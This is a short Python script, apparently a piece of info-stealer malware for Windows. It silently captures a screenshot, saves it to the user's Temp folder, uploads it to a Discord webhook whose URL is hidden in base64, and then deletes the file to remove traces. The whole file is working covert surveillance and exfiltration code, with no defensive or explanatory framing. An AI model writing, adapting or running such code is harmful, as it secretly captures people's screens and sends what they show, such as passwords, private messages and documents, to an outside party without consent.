import os.path, requests, os
from PIL import ImageGrab
import base64

def sikrinsat():
    user = os.path.expanduser("~")

    hook = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5Mzc2Mjg2OTI4NTM3MjA1NS9kZzgwcmo0b0tUNDVlQU5xVWVUaWl6eXlZRjYzdkxJaGtxNzJ6YXBkVjRYNlNRUW9GTVdyNTEyb1pDWjg1WnIydmlnRQ==").decode()

    captura = ImageGrab.grab()
    captura.save(user+"\\AppData\\Local\\Temp\\ss.png")

    file = {"file": open(user+"\\AppData\\Local\\Temp\\ss.png", "rb")}
    r = requests.post(hook, files=file)
    try:
     os.remove(user+"\\AppData\\Local\\Temp\\ss.png")
    except:
        pass
        
